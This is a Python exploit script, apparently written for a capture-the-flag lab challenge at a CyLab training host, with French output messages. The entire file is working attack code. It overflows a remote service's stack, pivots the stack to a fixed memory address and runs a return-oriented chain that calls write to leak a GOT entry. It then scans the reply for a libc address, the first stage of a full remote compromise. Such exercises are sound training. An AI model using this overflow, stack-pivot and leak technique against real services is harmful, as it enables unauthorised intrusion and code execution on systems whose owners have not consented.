import sys, socket, time, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31809
READ_SEQ = 0x400b6f
POP_RDI = 0x400c03
POP_RSI_R15 = 0x400c01
POP_RBP = 0x400828
LEAVE_RET = 0x400b96
WRITE_PLT = 0x400740
READ_GOT = 0x601fd8
WRITE_GOT = 0x601fb0
STAGE = 0x602900
PIVOT_PAIR = 0x602950


def p64(x):
    return struct.pack("<Q", x)


st2 = b"F" * 0x20
st2 += p64(0)
st2 += p64(POP_RDI) + p64(1)
st2 += p64(POP_RSI_R15) + p64(READ_GOT) + p64(0)
st2 += p64(WRITE_PLT)
st2 += p64(POP_RBP) + p64(PIVOT_PAIR) + p64(LEAVE_RET)
st2 = st2.ljust(0x70, b"G")
st2 += p64(0x602980) + p64(READ_SEQ)
print("len:", len(st2))

s = socket.create_connection((HOST, PORT), timeout=15)
s.settimeout(5)
time.sleep(0.3)
try:
    s.recv(4096)
except Exception:
    pass
s.sendall(b"A" * 32 + p64(STAGE) + p64(READ_SEQ))
time.sleep(0.4)
s.sendall(st2)
time.sleep(1.5)
out = b""
closed = False
try:
    while True:
        c = s.recv(65536)
        if not c:
            closed = True
            break
        out += c
except socket.timeout:
    pass
except Exception:
    closed = True
print("sortie:", len(out), "ferme:", closed)
print("tail:", repr(out[-200:]))
for i in range(len(out) - 5):
    v = int.from_bytes(out[i:i + 6], "little")
    if 0x700000000000 <= v <= 0x7fffffffffff:
        print("candidat libc a", i, ":", hex(v))
        break
s.close()
